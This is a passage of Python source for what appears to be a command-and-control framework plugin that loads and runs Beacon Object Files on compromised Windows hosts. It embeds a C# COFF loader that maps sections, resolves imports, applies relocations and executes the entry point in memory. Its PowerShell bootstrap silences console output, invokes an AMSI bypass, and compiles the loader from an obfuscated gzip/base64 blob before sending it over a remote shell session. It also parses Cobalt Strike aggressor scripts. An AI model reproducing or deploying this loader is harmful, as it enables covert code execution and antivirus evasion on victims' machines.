                    int st = NtWriteVirtualMemory(GetCurrentProcess(), secMem[i],
                                                 raw, (uint)raw.Length, out written);
                    if (st == 0 && written == raw.Length) {
                        rxWritten[i] = true;
                    } else {
                        // Fall back: flip back to RW and use Marshal.Copy.
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       PAGE_READWRITE, out old);
                    }
                }

                if (!rxWritten[i] && secRawSize[i] > 0) {
                    if (secRawOff[i] + secRawSize[i] > bof.Length)
                        throw new Exception("Section " + secNames[i] + " raw data out of bounds");
                    Marshal.Copy(bof, secRawOff[i], secMem[i], secRawSize[i]);
                }
            }

            // ---- 4. Symbol table ----
            int strTabOff = symOff + nsym * 18;
            string[] symNames  = new string[nsym];
            int[]    symSecNum = new int[nsym];
            uint[]   symVal    = new uint[nsym];
            byte[]   symClass  = new byte[nsym];

            for (int i = 0; i < nsym; i++) {
                int off = symOff + i * 18;
                if (off + 18 > bof.Length) throw new Exception("Symbol table truncated");
                ulong nf = _RU64(bof, off);
                uint ff  = (uint)(nf & 0xFFFFFFFF);
                if (ff == 0) {
                    int so = strTabOff + (int)(nf >> 32);
                    int e = so;
                    while (e < bof.Length && bof[e] != 0) e++;
                    symNames[i] = Encoding.ASCII.GetString(bof, so, e - so);
                } else {
                    byte[] nb = BitConverter.GetBytes(nf);
                    int nl = 0;
                    while (nl < 8 && nb[nl] != 0) nl++;
                    symNames[i] = Encoding.ASCII.GetString(nb, 0, nl);
                }
                symVal[i]    = _RU32(bof, off + 8);
                symSecNum[i] = _RS16(bof, off + 12);
                symClass[i]  = bof[off + 16];
            }

            // ---- 5. Resolve symbols ----
            IntPtr[] symAddr = new IntPtr[nsym];
            for (int i = 0; i < nsym; i++) {
                int sn = symSecNum[i];
                if (sn > 0 && sn <= nsec) {
                    symAddr[i] = (IntPtr)((long)secMem[sn - 1] + symVal[i]);
                    continue;
                }
                if (sn == 0 && symClass[i] == 2) {
                    string nm = symNames[i];
                    // Try the name as-is, then a normalised variant for x86
                    // where cdecl prepends "_" and stdcall appends "@N".
                    string[] tries = new string[] { nm };
                    if (!is64) {
                        if (nm.StartsWith("_")) {
                            tries = new string[] { nm, nm.Substring(1) };
                        } else {
                            tries = new string[] { nm, "_" + nm };
                        }
                    }
                    bool ok = false;
                    Exception lastEx = null;
                    foreach (string t in tries) {
                        // Strip trailing @N (stdcall) if present.
                        string cleaned = t;
                        int at = cleaned.IndexOf('@');
                        if (at > 0) cleaned = cleaned.Substring(0, at);
                        try { symAddr[i] = _Resolve(cleaned); ok = true; break; }
                        catch (Exception ex) { lastEx = ex; }
                    }
                    if (!ok)
                        throw new Exception("Symbol '" + nm + "': " +
                            (lastEx != null ? lastEx.Message : "unresolved"));
                } else {
                    symAddr[i] = IntPtr.Zero;
                }
            }

            // ---- 6. Relocations ----
            for (int si = 0; si < nsec; si++) {
                if (secRelocCnt[si] == 0) continue;
                for (int r = 0; r < secRelocCnt[si]; r++) {
                    int off = secRelocOff[si] + r * 10;
                    if (off + 10 > bof.Length) throw new Exception("Relocation table truncated");
                    uint va     = _RU32(bof, off);
                    uint symIdx = _RU32(bof, off + 4);
                    ushort type = _RU16(bof, off + 8);
                    IntPtr tgt  = (IntPtr)((long)secMem[si] + va);
                    long saL    = (symIdx < (uint)nsym) ? symAddr[symIdx].ToInt64() : 0;
                    long tgtL   = tgt.ToInt64();
                    bool viaK = rxWritten[si];

                    if (is64) {
                        switch (type) {
                            case 0x0000: break;                              // ABSOLUTE
                            case 0x0001: _WriteI64(tgt, saL, viaK); break;   // ADDR64
                            case 0x0002:                                     // ADDR32
                                _WriteI32(tgt, (int)(saL & 0xFFFFFFFF), viaK); break;
                            case 0x0003: break;                              // ADDR32NB
                            case 0x0004: case 0x0005: case 0x0006:
                            case 0x0007: case 0x0008: case 0x0009: {         // REL32..REL32_5
                                int addend = viaK
                                    ? BitConverter.ToInt32(_ReadBytes(tgt, 4), 0)
                                    : Marshal.ReadInt32(tgt);
                                int n = type - 0x0004;
                                long val = saL - (tgtL + 4 + n) + addend;
                                if (val > int.MaxValue || val < int.MinValue)
                                    throw new Exception("REL32 overflow at sec=" + secNames[si] +
                                                        " off=" + va);
                                _WriteI32(tgt, (int)val, viaK);
                                break;
                            }
                            default:
                                throw new Exception("Unsupported x64 reloc: 0x" + type.ToString("X4"));
                        }
                    } else {
                        switch (type) {
                            case 0x0000: break;                              // I386_ABSOLUTE
                            case 0x0006:                                     // I386_DIR32
                                _WriteI32(tgt, (int)(saL & 0xFFFFFFFF), viaK); break;
                            case 0x0007: break;                              // I386_DIR32NB
                            case 0x000A: break;                              // I386_SECTION
                            case 0x000B: break;                              // I386_SECREL
                            case 0x0014: {                                   // I386_REL32
                                int addend = viaK
                                    ? BitConverter.ToInt32(_ReadBytes(tgt, 4), 0)
                                    : Marshal.ReadInt32(tgt);
                                long val = saL - (tgtL + 4) + addend;
                                if (val > int.MaxValue || val < int.MinValue)
                                    throw new Exception("REL32 overflow at sec=" + secNames[si] +
                                                        " off=" + va);
                                _WriteI32(tgt, (int)val, viaK);
                                break;
                            }
                            default:
                                throw new Exception("Unsupported x86 reloc: 0x" + type.ToString("X4"));
                        }
                    }
                }
            }

            // ---- 7. Finalize section protections ----
            // Executable sections: RX (or already RX if rxWritten).
            // Read-only data: R. Writable data: RW (left alone).
            for (int i = 0; i < nsec; i++) {
                bool exec = (secChars[i] & IMAGE_SCN_MEM_EXECUTE) != 0;
                if (exec) {
                    if (!rxWritten[i]) {
                        uint old;
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       PAGE_EXECUTE_READ, out old);
                    }
                } else {
                    uint finalProt = _FinalProt(secChars[i]);
                    if (finalProt != PAGE_READWRITE) {
                        uint old;
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       finalProt, out old);
                    }
                }
            }

            // ---- 8. Zero the COFF bytes from managed memory ----
            Array.Clear(bof, 0, bof.Length);

            // ---- 9. Find entry point ----
            IntPtr entry = IntPtr.Zero;
            string[] candidates = is64
                ? new string[] { entryName, "go", "_go" }
                : new string[] { entryName, "_go", "go" };
            foreach (string cand in candidates) {
                for (int i = 0; i < nsym; i++) {
                    if (symNames[i] == cand && symAddr[i] != IntPtr.Zero) {
                        entry = symAddr[i];
                        break;
                    }
                }
                if (entry != IntPtr.Zero) break;
            }
            if (entry == IntPtr.Zero)
                throw new Exception("Entry point not found (tried: " +
                                    entryName + ", go, _go)");

            // ---- 10. Arguments ----
            int argsLen = (packedArgs != null) ? packedArgs.Length : 0;
            int allocLen = Math.Max(argsLen, 1);
            IntPtr argsPtr = VirtualAlloc(IntPtr.Zero, (UIntPtr)allocLen,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (argsPtr == IntPtr.Zero)
                throw new Exception("VirtualAlloc args failed");

            IntPtr veh = IntPtr.Zero;
            try {
                if (argsLen > 0) Marshal.Copy(packedArgs, 0, argsPtr, argsLen);

                // ---- 11. Invoke under a vectored exception handler ----
                _vehFired = 0;
                veh = AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehDel));

                BofEntry fn = (BofEntry)Marshal.GetDelegateForFunctionPointer(
                    entry, typeof(BofEntry));
                try {
                    fn(argsPtr, argsLen);
                } catch (Exception ex) {
                    _AppendOut("\n[BOF exception] " + ex.Message + "\n");
                }
                if (_vehFired != 0)
                    _AppendOut("\n[BOF raised a native exception; loader survived]\n");
            } finally {
                if (veh != IntPtr.Zero) RemoveVectoredExceptionHandler(veh);
                VirtualFree(argsPtr, UIntPtr.Zero, MEM_RELEASE);
                // Zero the argument buffer before releasing (defensive).
                if (argsLen > 0) Array.Clear(packedArgs, 0, packedArgs.Length);
            }

        } finally {
            if (blob != IntPtr.Zero) VirtualFree(blob, UIntPtr.Zero, MEM_RELEASE);
            foreach (IntPtr p in _fmtAllocs) {
                if (p != IntPtr.Zero) VirtualFree(p, UIntPtr.Zero, MEM_RELEASE);
            }
            _fmtAllocs.Clear();
            _kv.Clear();
        }

        return _out.ToString().Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
    }

    // Read N bytes from an address (works on RX pages).
    static byte[] _ReadBytes(IntPtr addr, int n) {
        byte[] b = new byte[n];
        Marshal.Copy(addr, b, 0, n);
        return b;
    }
}
'''

# --------------------------------------------------------------------------
# Compile-time tagging — randomized class name
# --------------------------------------------------------------------------

_CLASS_NAME = f'BofLoader_{_RAND}'
_TAGGED_CS  = _CS_SOURCE.replace('class BofLoader', f'class {_CLASS_NAME}', 1)
_CS_GZ_B64  = base64.b64encode(
    gzip.compress(_TAGGED_CS.encode('utf-8'), compresslevel=9)
).decode('ascii')

# Randomized markers
_MARK_OUT  = f'__BOF{_RAND}O__:'
_MARK_OK   = f'__BOF{_RAND}K__:'
_MARK_ERR  = f'__BOF{_RAND}E__:'
_MARK_INFO = f'__BOF{_RAND}I__:'
_MARK_END  = f'__BOF{_RAND}Z__'

_VALID_PATH  = re.compile(r'^[A-Za-z0-9_\-./\\: ]+$')
_VALID_ENTRY = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*$')
_MAX_BOF_BYTES = 2 * 1024 * 1024


# --------------------------------------------------------------------------
# PowerShell helpers
# --------------------------------------------------------------------------

def _bootstrap_ps():
    return (
        # Silence PowerShell's own console noise before anything else.
        "$ProgressPreference='SilentlyContinue';"
        "$WarningPreference='SilentlyContinue';"
        "$VerbosePreference='SilentlyContinue';"
        "$InformationPreference='SilentlyContinue';"
        "$ErrorActionPreference='Stop';"
        "try{[Console]::OutputEncoding=[Text.Encoding]::UTF8}catch{};"
        +
        _AMSI_BYPASS_PS +
        f"$__bof_cached = [bool]('{_CLASS_NAME}' -as [type])\n"
        f"if (-not $__bof_cached) {{\n"
        f"  $b = '{_CS_GZ_B64}'\n"
        "  $raw = [Convert]::FromBase64String($b)\n"
        "  $ms  = New-Object IO.MemoryStream(,$raw)\n"
        "  $gz  = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)\n"
        "  $sr  = New-Object IO.StreamReader($gz)\n"
        "  $src = $sr.ReadToEnd()\n"
        "  $sr.Dispose(); $gz.Dispose(); $ms.Dispose()\n"
        "  Add-Type -TypeDefinition $src -Language CSharp -ErrorAction Stop\n"
        "}\n"
        f"if ($__bof_cached) {{ Write-Output '{_MARK_INFO}loader cached' }}\n"
        f"else             {{ Write-Output '{_MARK_INFO}loader compiled' }}\n"
    )


def _exec_ps(bof_gz_b64, args_b64, entry):
    """
    Returns (powershell_script, markers) where markers is a 4-tuple:
        (mark_out, mark_ok, mark_err, mark_end)
    Each call generates a fresh instance namespace so no two BOF runs on
    the same session share the same marker strings.
    """
    inst = os.urandom(3).hex()
    mark_out = f'__BOF{_RAND}{inst}O__:'
    mark_ok  = f'__BOF{_RAND}{inst}K__:'
    mark_err = f'__BOF{_RAND}{inst}E__:'
    mark_end = f'__BOF{_RAND}{inst}Z__'

    ps = _bootstrap_ps() + f"""
$gzBytes = [Convert]::FromBase64String('{bof_gz_b64}')
$outMs = New-Object IO.MemoryStream
$zis = New-Object IO.Compression.DeflateStream(
    (New-Object IO.MemoryStream(,$gzBytes)),
    [IO.Compression.CompressionMode]::Decompress)
$zis.CopyTo($outMs)
$bofBytes = $outMs.ToArray()
$zis.Dispose(); $outMs.Dispose()
$argBytes = [Convert]::FromBase64String('{args_b64}')
try {{
  $lines = [{_CLASS_NAME}]::ExecuteBof($bofBytes, '{entry}', $argBytes)
  foreach ($l in $lines) {{
    if ($l) {{ Write-Output ('{mark_out}' + $l) }}
  }}
  Write-Output ('{mark_ok}execution complete')
}} catch {{
  Write-Output ('{mark_err}' + $_.Exception.Message)
}}
$bofBytes = $null
$argBytes = $null
$gzBytes  = $null
[System.GC]::Collect()
Write-Output '{mark_end}'
"""
    return ps, (mark_out, mark_ok, mark_err, mark_end)


def _run_ps(session, ps, timeout=45.0, until_marker=_MARK_END):
    handler = session._handler
    sock    = session._client_sock
    try:
        handler._flush_shell(sock, timeout=0.5)
    except Exception:
        pass
    try:
        if not handler._send_win_ps(sock, ps):
            return ''
    except Exception:
        return ''
    try:
        return handler.recv_output(
            sock, timeout=timeout, until_marker=until_marker,
        ) or ''
    except Exception:
        return ''


def _lines_after(text, marker, end_marker=_MARK_END):
    out = []
    for raw in text.splitlines():
        line = raw.rstrip('\r')
        idx = line.find(marker)
        if idx < 0:
            continue
        payload = line[idx + len(marker):]
        if end_marker in payload:
            payload = payload.split(end_marker, 1)[0]
        if payload:
            out.append(payload)
    return out


# --------------------------------------------------------------------------
# Argument packing
# --------------------------------------------------------------------------

def _pack_string_arg(value):
    body = value.encode('utf-8') + b'\x00'
    return struct.pack('<I', len(body)) + body


def _pack_args_from_format(args, fmt):
    """Pack N args according to a bof_pack-style format string."""
    if len(args) < len(fmt):
        raise ValueError(f"format needs {len(fmt)} args, got {len(args)}")
    out = bytearray()
    for ch, val in zip(fmt, args):
        if ch == 'z':
            body = val.encode('utf-8') + b'\x00'
            out += struct.pack('<I', len(body)) + body
        elif ch == 'Z':
            body = val.encode('utf-16-le') + b'\x00\x00'
            out += struct.pack('<I', len(body)) + body
        elif ch == 'i':
            out += struct.pack('<i', int(val))
        elif ch == 's':
            out += struct.pack('<h', int(val))
        elif ch == 'b':
            raw = base64.b64decode(val)
            out += struct.pack('<I', len(raw)) + raw
        else:
            raise ValueError(f"unsupported format char: {ch!r}")
    return bytes(out)


# --------------------------------------------------------------------------
# Local COFF inspector — operator-side, no target contact
# --------------------------------------------------------------------------

def _parse_bof_metadata(bof_bytes):
    if len(bof_bytes) < 20:
        return None
    machine, nsec = struct.unpack_from('<HH', bof_bytes, 0)
    sym_off, nsym = struct.unpack_from('<II', bof_bytes, 8)

    sections = []
    for i in range(nsec):
        off = 20 + i * 40
        if off + 40 > len(bof_bytes):
            break
        name = bof_bytes[off:off + 8].rstrip(b'\x00').decode('ascii', 'replace')
        vsize, _, rawsz, _, relocoff = struct.unpack_from('<IIIII', bof_bytes, off + 8)
        reloccnt = struct.unpack_from('<H', bof_bytes, off + 32)[0]
        chars = struct.unpack_from('<I', bof_bytes, off + 36)[0]
        sections.append({
            'name': name, 'vsize': vsize, 'raw_size': rawsz,
            'relocs': reloccnt, 'chars': chars, 'reloc_off': relocoff,
        })

    strtab_off = sym_off + nsym * 18
    imports, entries = [], []
    for i in range(nsym):
        soff = sym_off + i * 18
        if soff + 18 > len(bof_bytes):
            break
        nf = struct.unpack_from('<Q', bof_bytes, soff)[0]
        secnum = struct.unpack_from('<h', bof_bytes, soff + 12)[0]
        storage = bof_bytes[soff + 16]
        if (nf & 0xFFFFFFFF) == 0:
            str_off = strtab_off + (nf >> 32)
            end = bof_bytes.find(b'\x00', str_off)
            if end < 0:
                end = len(bof_bytes)
            name = bof_bytes[str_off:end].decode('ascii', 'replace')
        else:
            nb = nf.to_bytes(8, 'little')
            end = nb.find(b'\x00')
            name = nb[:end if end >= 0 else 8].decode('ascii', 'replace')

        if secnum == 0 and storage == 2:
            imports.append(name)
        elif secnum > 0 and storage == 2:
            entries.append(name)

    return {
        'machine': machine, 'sections': sections,
        'imports': sorted(set(imports)), 'entries': sorted(set(entries)),
        'nsym': nsym, 'size': len(bof_bytes),
    }


def _print_bof_info(session, colors, bof_path, meta):
    sha = hashlib.sha256(open(bof_path, 'rb').read()).hexdigest()
    _emit(session, f"{colors['cyan']}BOF:      {bof_path}{colors['end']}")
    _emit(session, f"  Size:    {meta['size']} bytes")
    _emit(session, f"  SHA256:  {sha}")
    mach = meta['machine']
    label = 'AMD64' if mach == 0x8664 else ('I386' if mach == 0x014c else 'unknown')
    _emit(session, f"  Machine: 0x{mach:04X} ({label})")

    _emit(session, f"  Sections ({len(meta['sections'])}):")
    for s in meta['sections']:
        flags = []
        if s['chars'] & 0x20000000: flags.append('X')
        if s['chars'] & 0x40000000: flags.append('R')
        if s['chars'] & 0x80000000: flags.append('W')
        _emit(session,
              f"    {s['name']:8s}  vsize={s['vsize']:>6d}  "
              f"raw={s['raw_size']:>6d}  relocs={s['relocs']:>4d}  "
              f"[{''.join(flags) or '-'}]")

    _emit(session, f"  Symbols: {meta['nsym']}")
    if meta['entries']:
        _emit(session, f"  Internal entry candidates ({len(meta['entries'])}):")
        for name in meta['entries'][:30]:
            _emit(session, f"    {name}")
        if len(meta['entries']) > 30:
            _emit(session, f"    ... and {len(meta['entries']) - 30} more")

    if meta['imports']:
        _emit(session, f"  External imports ({len(meta['imports'])}):")
        for name in meta['imports'][:50]:
            _emit(session, f"    {name}")
        if len(meta['imports']) > 50:
            _emit(session, f"    ... and {len(meta['imports']) - 50} more")


# ==========================================================================
# REGISTRY — registered BOF commands, persisted to .tornadorevc2_bofs.json
# ==========================================================================

_REGISTRY_FILE = os.path.join(os.path.dirname(__file__), '..', '..', '..', 'logs', '.tornadorevc2_bofs.json')


def _load_registry():
    try:
        if os.path.isfile(_REGISTRY_FILE):
            with open(_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}


def _save_registry(reg):
    try:
        with open(_REGISTRY_FILE, 'w', encoding='utf-8') as f:
            json.dump(reg, f, indent=2, sort_keys=True)
        return True
    except Exception:
        return False


# ==========================================================================
# CNA parser — extracts `alias <name> { bof("path", bof_pack($1,"fmt",...)) }`
# ==========================================================================

_ALIAS_RE    = re.compile(r'\balias\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{')
_BOF_LIT_RE  = re.compile(r'\bbof\s*\(\s*(["\'])([^"\']+)\1')             # bof("literal.o")
_BOFPACK_RE  = re.compile(r'\bbof_pack\s*\(\s*[^,]+,\s*(["\'])(.*?)\1')
_RESOURCE_RE = re.compile(r'\bscript_resource\s*\(\s*(["\'])([^"\']+)\1')
_BCR_RE      = re.compile(                                                # beacon_command_register
    r'\bbeacon_command_register\s*\(\s*(["\'])([^"\']+)\1\s*,\s*(["\'])([^"\']*)\3',
    re.DOTALL,
)

# Aggressor string concatenation:  "WhoAmI." . "o"  →  "WhoAmI.o"
_CONCAT_DQ_RE = re.compile(r'"((?:[^"\\]|\\.)*)"\s*\.\s*"((?:[^"\\]|\\.)*)"')
_CONCAT_SQ_RE = re.compile(r"'((?:[^'\\]|\\.)*)'\s*\.\s*'((?:[^'\\]|\\.)*)'")


def _collapse_string_concat(src):
    """
    Collapse Aggressor string concatenation so literal-path regexes can
    find whole filenames. Turns

        script_resource("WhoAmI." . "o")

    into

        script_resource("WhoAmI.o")

    Repeated until stable so chains like "A" . "B" . "C" work.
    """
    def dq(m):
        return '"' + m.group(1) + m.group(2) + '"'
    def sq(m):
        return "'" + m.group(1) + m.group(2) + "'"

    prev = None
    while prev != src:
        prev = src
        src = _CONCAT_DQ_RE.sub(dq, src)
        src = _CONCAT_SQ_RE.sub(sq, src)
    return src


def _read_cna_text(path):
    """
    Read a CNA file trying common encodings. Returns (text, encoding_label)
    or (None, None) if the file is unreadable.
    """
    try:
        with open(path, 'rb') as f:
            raw = f.read()
    except OSError:
        return None, None

    if not raw:
        return '', 'empty'

    # Explicit BOMs first
    if raw[:3] == b'\xef\xbb\xbf':
        try:
            return raw[3:].decode('utf-8'), 'utf-8-sig'
        except UnicodeDecodeError:
            pass
    if raw[:2] in (b'\xff\xfe', b'\xfe\xff'):
        try:
            return raw.decode('utf-16'), 'utf-16'
        except UnicodeDecodeError:
            pass

    # UTF-16 without BOM: every second byte is null in the ASCII range
    if len(raw) >= 4:
        zeros_at_odd  = sum(1 for i in range(1, min(len(raw), 64), 2) if raw[i] == 0)
        zeros_at_even = sum(1 for i in range(0, min(len(raw), 64), 2) if raw[i] == 0)
        if zeros_at_odd > 16:
            try:
                return raw.decode('utf-16-le'), 'utf-16-le'
            except UnicodeDecodeError:
                pass
        if zeros_at_even > 16:
            try:
                return raw.decode('utf-16-be'), 'utf-16-be'
            except UnicodeDecodeError:
                pass

    # Plain UTF-8
    try:
        return raw.decode('utf-8'), 'utf-8'
    except UnicodeDecodeError:
        pass

    # Last resort
    return raw.decode('latin-1'), 'latin-1'


def _find_matching_brace(text, open_idx):
    """open_idx points at '{'. Returns index of matching '}' or -1."""
    depth = 0
    i = open_idx
    in_str = None
    while i < len(text):
        c = text[i]
        if in_str:
            if c == '\\':
                i += 2
                continue
            if c == in_str:
                in_str = None
        else:
            if c in ('"', "'"):
                in_str = c
            elif c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    return i
        i += 1
    return -1


def _resolve_bof_path(cna_dir, bof_path):
    bof_path = bof_path.strip()
    if not bof_path:
        return bof_path
    if os.path.isabs(bof_path):
        return bof_path
    if bof_path.startswith('$'):
        return bof_path
    return os.path.normpath(os.path.join(cna_dir, bof_path))


def _parse_cna(path):
    """
    Parse a .cna file and return a dict:
        {cmd_name: {"path": <bof_path>, "format": <fmt_str>, "description": <str>}}

    Handles the common registration patterns:

      1. TrustedSec BOF Library:
             beacon_command_register("name", "desc", "...");
             alias name {
                 $bof = script_resource("file.o");
                 bof($bof);
             }

      2. Classic Cobalt Strike:
             alias name {
                 bof("file.o", bof_pack($1, "z", $arg));
             }

      3. Bare bof("file.o") with no alias — registered by object filename.

    Relative paths are resolved against the CNA's directory.
    """
    src, enc = _read_cna_text(path)
    if src is None:
        raise OSError(f"could not read {path}")

    # Collapse `"WhoAmI." . "o"` → `"WhoAmI.o"` before regex matching.
    src = _collapse_string_concat(src)

    cna_dir = os.path.dirname(os.path.abspath(path))
    registered = {}

    # -- 1. Collect command metadata from beacon_command_register -------------
    command_meta = {}   # name -> description
    for m in _BCR_RE.finditer(src):
        name = m.group(2)
        desc = (m.group(4) or '').strip()
        if name:
            command_meta[name] = desc

    # -- 2. Walk each alias block --------------------------------------------
    for m in _ALIAS_RE.finditer(src):
        name = m.group(1)
        open_brace = m.end() - 1
        close_brace = _find_matching_brace(src, open_brace)
        if close_brace < 0:
            continue
        body = src[open_brace + 1:close_brace]

        # Determine BOF path. Priority:
        #   a. script_resource("...")  — canonical TrustedSec pattern
        #   b. bof("literal.o")        — classic inline pattern
        bof_path = None
        rm = _RESOURCE_RE.search(body)
        if rm:
            bof_path = _resolve_bof_path(cna_dir, rm.group(2))
        else:
            lm = _BOF_LIT_RE.search(body)
            if lm:
                bof_path = _resolve_bof_path(cna_dir, lm.group(2))

        if not bof_path:
            continue

        # Format string from bof_pack($N, "fmt", ...)
        fmt = ''
        pm = _BOFPACK_RE.search(body)
        if pm:
            fmt = pm.group(2)

        # Description: prefer beacon_command_register, fall back to leading comment
        desc = command_meta.get(name, '')
        if not desc:
            header = src[:m.start()].rstrip()
            if header.endswith('*/'):
                start = header.rfind('/*')
                if start >= 0:
                    desc = ' '.join(
                        line.strip().lstrip('#').lstrip('*').strip()
                        for line in header[start + 2:-2].splitlines()
                    ).strip()

        registered[name] = {
            'path':   bof_path,
            'format': fmt,
            'desc':   desc,
        }

    # -- 3. Fallback A: no alias blocks, but BCR + script_resource -----------
    #    e.g. some CNAs put the bof() call outside any alias.
    if not registered and command_meta:
        rm = _RESOURCE_RE.search(src)
        if not rm:
            lm = _BOF_LIT_RE.search(src)
            if lm:
                bof_path = _resolve_bof_path(cna_dir, lm.group(2))
            else:
                bof_path = None
        else:
            bof_path = _resolve_bof_path(cna_dir, rm.group(2))

        if bof_path:
            fmt = ''
            pm = _BOFPACK_RE.search(src)
            if pm:
                fmt = pm.group(2)
            for name, desc in command_meta.items():
                registered[name] = {
                    'path':   bof_path,
                    'format': fmt,
                    'desc':   desc,
                }

    # -- 4. Fallback B: bare bof("literal.o") with no alias / no BCR --------
    if not registered:
        for lm in _BOF_LIT_RE.finditer(src):
            bof_path = _resolve_bof_path(cna_dir, lm.group(2))
            base = os.path.splitext(os.path.basename(bof_path))[0]
            name = re.sub(r'[^A-Za-z0-9_]', '_', base).strip('_')
            if not name:
                continue
            if name[0].isdigit():
                name = 'bof_' + name
            if name in registered:
                continue
            registered[name] = {
                'path':   bof_path,
                'format': '',
                'desc':   f'(auto-detected from {os.path.basename(path)}, enc={enc})',
            }

    return registered


# ==========================================================================
# Operator-machine helpers
# ==========================================================================

_COMPILER_CANDIDATES = {
    'x64': ['x86_64-w64-mingw32-gcc', 'x86_64-w64-mingw32-gcc.exe'],
    'x86': ['i686-w64-mingw32-gcc',   'i686-w64-mingw32-gcc.exe'],
}
_COMPILER_CXX_CANDIDATES = {
    'x64': ['x86_64-w64-mingw32-g++', 'x86_64-w64-mingw32-g++.exe'],
    'x86': ['i686-w64-mingw32-g++',   'i686-w64-mingw32-g++.exe'],
}

if os.name == 'nt':
    _COMPILER_CANDIDATES['x64'] += [
        r'C:\msys64\mingw64\bin\x86_64-w64-mingw32-gcc.exe',
        r'C:\msys64\ucrt64\bin\x86_64-w64-mingw32-gcc.exe',
        r'C:\ProgramData\chocolatey\bin\x86_64-w64-mingw32-gcc.exe',
    ]
    _COMPILER_CANDIDATES['x86'] += [
        r'C:\msys64\mingw32\bin\i686-w64-mingw32-gcc.exe',
        r'C:\ProgramData\chocolatey\bin\i686-w64-mingw32-gcc.exe',
    ]
    _COMPILER_CXX_CANDIDATES['x64'] += [
        r'C:\msys64\mingw64\bin\x86_64-w64-mingw32-g++.exe',
        r'C:\msys64\ucrt64\bin\x86_64-w64-mingw32-g++.exe',
        r'C:\ProgramData\chocolatey\bin\x86_64-w64-mingw32-g++.exe',
    ]
    _COMPILER_CXX_CANDIDATES['x86'] += [
        r'C:\msys64\mingw32\bin\i686-w64-mingw32-g++.exe',
        r'C:\ProgramData\chocolatey\bin\i686-w64-mingw32-g++.exe',
    ]


def _find_mingw_compiler(arch='x64', lang='c'):
    """
    Return path to a mingw compiler for the requested arch and language.
      arch : 'x64' or 'x86'
      lang : 'c'  → gcc,  'cxx' → g++

    Returns None if no compiler for that arch/lang is available.
    """
    table = _COMPILER_CXX_CANDIDATES if lang == 'cxx' else _COMPILER_CANDIDATES
    for c in table.get(arch, ()):
        try:
            r = subprocess.run([c, '--version'], capture_output=True, timeout=5)
            if r.returncode == 0:
                return c
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            continue
    return None


def _arch_of(bof_bytes):
    """Return 'x64', 'x86', or None from a COFF header."""
    if len(bof_bytes) < 2:
        return None
    m = struct.unpack_from('<H', bof_bytes, 0)[0]
    if m == 0x8664: return 'x64'
    if m == 0x014c: return 'x86'
    return None


def _find_beacon_header(search_dir):
    """Return path to beacon.h or None."""
    candidates = [
        os.path.join(search_dir, 'beacon.h'),
        os.path.join(search_dir, 'include', 'beacon.h'),
        os.path.join(os.path.expanduser('~'), '.tornadorevc2', 'include', 'beacon.h'),
        os.path.join(os.getcwd(), 'beacon.h'),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


# ==========================================================================
# Output helpers (work with or without a live SessionContext)
# ==========================================================================

_EMPTY_COLORS = {
    'cyan': '', 'green': '', 'yellow': '', 'red': '',
    'bold': '', 'end': '', 'blue': '',
}


def _colors_of(session):
    if session is not None and hasattr(session, 'colors'):
        return session.colors
    return dict(_EMPTY_COLORS)


def _emit(session, text):
    if session is not None:
        try:
            session.print(text)
            return
        except Exception:
            pass
    print(text)


def _event(session, msg):
    if session is not None:
        try:
            session.log_event(msg)
        except Exception:
            pass


def _result(session, name, report, detail=''):
    if session is not None:
        try:
            session.log_plugin_result(name, report, detail)
        except Exception:
            pass


# ==========================================================================
# Subcommand handlers
# ==========================================================================

def _do_import(session, opts):
    colors = _colors_of(session)
    cna = opts['cna']
    if not os.path.isfile(cna):
        _emit(session, f"{colors['red']}CNA not found: {cna}{colors['end']}")
        return 1

    try:
        parsed = _parse_cna(cna)
    except Exception as e:
        _emit(session, f"{colors['red']}Failed to parse CNA: {e}{colors['end']}")
        return 1

    if not parsed:
        _emit(session, f"{colors['yellow']}No BOF aliases found in {cna}{colors['end']}")
        # Diagnostics: show size, detected encoding, and first lines so the
        # operator can see whether the file is malformed or uses an
        # unsupported syntax.
        try:
            text, enc = _read_cna_text(cna)
            size = os.path.getsize(cna)
            _emit(session, f"{colors['cyan']}  file: {size} bytes, encoding={enc}{colors['end']}")
            if text:
                head = '\n'.join(text.splitlines()[:8])
                _emit(session, f"{colors['blue']}  first lines:{colors['end']}")
                for ln in head.splitlines():
                    _emit(session, f"    {ln}")
        except Exception as e:
            _emit(session, f"{colors['red']}  diagnostic failed: {e}{colors['end']}")
        return 1

    reg = _load_registry()
    added = []
    for name, meta in parsed.items():
        # Resolve the BOF path now so the user gets an immediate warning if
        # the object file is missing.
        bof_path = meta['path']
        if not os.path.isfile(bof_path):
            _emit(session, f"{colors['yellow']}  ! BOF file missing for '{name}': "
                           f"{bof_path}{colors['end']}")
        reg[name] = {
            'path':   bof_path,
            'format': meta.get('format', ''),
            'desc':   meta.get('desc', ''),
            'source': os.path.abspath(cna),
        }
        added.append(name)

    if not _save_registry(reg):
        _emit(session, f"{colors['red']}Failed to persist registry{colors['end']}")
        return 1

    _emit(session, f"{colors['green']}Imported {len(added)} BOF command(s) from {cna}:{colors['end']}")
    for name in sorted(added):
        entry = reg[name]
        fmt = entry.get('format') or '(no args)'
        exists = 'ok' if os.path.isfile(entry['path']) else 'MISSING'
        _emit(session, f"  {colors['cyan']}{name:<20}{colors['end']}  "
                       f"fmt={fmt:<8}  file={exists}")
    _emit(session, f"{colors['yellow']}Use: bof <name> [args...]{colors['end']}")
    _event(session, f"bofloader import: {cna} -> {added}")
    _result(session, 'bofloader', '\n'.join(added), f'import {cna}')
    return 0


def _do_delete(session, opts):
    colors = _colors_of(session)
    name = opts['name']
    reg = _load_registry()
    if name not in reg:
        _emit(session, f"{colors['red']}No such BOF command: {name}{colors['end']}")
        return 1
    del reg[name]
